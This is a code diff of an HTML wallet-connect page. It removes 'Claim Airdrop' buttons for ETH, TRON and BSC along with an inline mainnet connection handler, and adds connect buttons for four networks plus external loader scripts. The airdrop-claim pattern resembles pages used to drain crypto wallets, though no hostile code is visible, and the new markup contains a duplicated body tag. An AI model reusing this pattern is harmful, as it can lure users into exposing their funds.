@@ -10,24 +10,18 @@
 </head>
 <body>
 
-<h1>Connect your Wallet</h1>
-<button id="connectButton">Connect MetaMask</button>
-<button id="claimAirdropButton" disabled>Claim Airdrop (ETH)</button>
-<button id="connectTronlinkButton">Connect TronLink</button>
-<button id="claimTronAirdropButton" disabled>Claim Airdrop (TRON)</button>
-<button id="connectTrustwalletButton">Connect TrustWallet</button>
-<button id="claimTrustwalletAirdropButton" disabled>Claim Airdrop (BSC)</button>
+<body>
+    <div>
+        <h1>Connect to your wallet</h1>
+        <button id="connectMetaMask">Connect MetaMask</button>
+        <button id="connectBSC">Connect BSC</button>
+        <button id="connectTronLink">Connect TronLink</button>
+        <button id="connectSepolia">Connect Sepolia</button>
+    </div>
 
-<script src="js/common.js"></script> 
-<script src="deeplinks/metamask-deep.js"></script> <!-- For mobile MetaMask -->
-
-<script>
-    // Add event listener to the connect button
-    document.getElementById('connectButton').addEventListener('click', function() {
-        // You can modify the network and wallet based on your needs
-        handleWalletConnection('metamask', 'eth', ['0x1']); // eth network with chain ID 0x1 (Ethereum mainnet)
-    });
-</script>
-
+    <script src="js/loader.js"></script>
+    <script src="js/common.js"></script>
+    <script src="js/metamask.js"></script>
+</body>
 </body>
 </html>
